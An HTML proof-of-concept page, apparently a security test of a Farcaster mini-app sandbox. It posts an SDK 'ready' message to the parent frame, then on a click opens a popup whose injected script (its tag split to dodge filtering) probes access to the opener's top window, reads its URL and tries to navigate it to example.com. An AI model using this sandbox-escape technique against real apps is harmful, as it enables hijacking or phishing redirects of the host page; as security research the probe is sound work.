<!doctype html>
<html>
	<head>
		<meta charset="utf-8" />
		<title>PoC</title>
	</head>
	<body style="background: #17101f; color: #fff; font-family: sans-serif; padding: 20px">
		<h2>Farcaster Mini App PoC</h2>
		<button id="test" style="padding: 20px 40px; font-size: 20px; background: #dc2626; color: white; border: none; border-radius: 8px; cursor: pointer">Click to Continue</button>
		<pre id="log">Ready...</pre>
		<script>
			var logEl = document.getElementById("log");
			function log(msg) {
				logEl.textContent += "\n" + msg;
			}

			window.addEventListener("message", function (e) {
				if (e.data && e.data.id >= 100) {
					log("Response: " + JSON.stringify(e.data).slice(0, 200));
				}
			});

			// Ready on load
			setTimeout(function () {
				window.parent.postMessage({ id: 100, type: "APPLY", path: ["ready"], argumentList: [{ type: "RAW", value: {} }] }, "*");
				log("SDK ready sent");
			}, 1000);

			// The actual popup test — on real button click
			document.getElementById("test").addEventListener("click", function () {
				log("Opening popup...");
				var popup = window.open("about:blank");
				if (popup) {
					log("POPUP OPENED!");
					try {
						popup.document.write(
							'<pre id="r">Testing...</pre>' +
								"<scr" +
								"ipt>" +
								'var r = document.getElementById("r");' +
								"var lines = [];" +
								'try { lines.push("opener: " + !!opener); } catch(e) { lines.push("opener err: " + e.message); }' +
								'try { lines.push("opener.top: " + !!opener.top); } catch(e) { lines.push("opener.top err: " + e.message); }' +
								'try { lines.push("top href: " + opener.top.location.href); } catch(e) { lines.push("top href err: " + e.message); }' +
								'try { opener.top.location = "https://example.com"; lines.push("TOP NAV: WORKED!!!"); } catch(e) { lines.push("TOP NAV err: " + e.message); }' +
								'r.textContent = lines.join("\\n");' +
								"</scr" +
								"ipt>",
						);
						popup.document.close();
					} catch (e) {
						log("Write error: " + e.message);
					}
				} else {
					log("Popup blocked");
				}
			});
		</script>
	</body>
</html>
